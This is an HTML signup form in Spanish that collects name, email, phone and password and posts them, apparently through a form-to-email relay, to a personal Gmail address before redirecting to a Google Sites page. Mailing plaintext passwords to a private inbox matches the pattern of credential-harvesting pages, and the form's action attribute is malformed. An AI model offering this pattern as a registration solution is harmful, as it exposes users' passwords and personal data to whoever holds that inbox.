<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Registro</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            margin-bottom: 20px;
            color: #333;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
            font-size: 14px;
        }
        input[type="text"],
        input[type="email"],
        input[type="tel"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
        }
        input:focus {
            border-color: #4CAF50;
            outline: none;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 10px;
        }
        .checkbox-group label {
            margin-bottom: 0;
            cursor: pointer;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 15px;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
<body>

<div class="form-container">
    <h2>Crear Cuenta</h2>
    
    <!-- REEMPLAZA dartkoo2016@gmail.com - https://sites.google.com/view/patty2027 POR TU CORREO REAL -->
    <form action="dartkoo2016@gmail.com" method="POST">
        
        <!-- Redirección opcional tras enviar (puedes poner tu web o dejarlo así) -->
        <input type="hidden" name="_next" value="https://sites.google.com/view/patty2027">
        <!-- Evita el captcha molesto (opcional) -->
        <input type="hidden" name="_captcha" value="false">

        <div class="form-group">
            <label for="nombre">Nombre Completo</label>
            <input type="text" id="nombre" name="nombre" placeholder="Juan Pérez" required>
        </div>

        <div class="form-group">
            <label for="email">Correo Electrónico</label>
            <input type="email" id="email" name="email" placeholder="juan@correo.com" required>
        </div>

        <div class="form-group">
            <label for="telefono">Teléfono (Móvil)</label>
            <input type="tel" id="telefono" name="telefono" placeholder="5512345678" required>
        </div>

        <div class="form-group">
            <label for="password">Contraseña</label>
            <input type="password" id="password" name="password" placeholder="Mínimo 8 caracteres" minlength="8" required>
        </div>

        <div class="checkbox-group">
            <input type="checkbox" id="terminos" name="terminos" value="Aceptados" required>
            <label for="terminos">Acepto los términos y condiciones</label>
        </div>

        <button type="submit">Registrarse</button>
    </form>
</div>

</body>
</html>
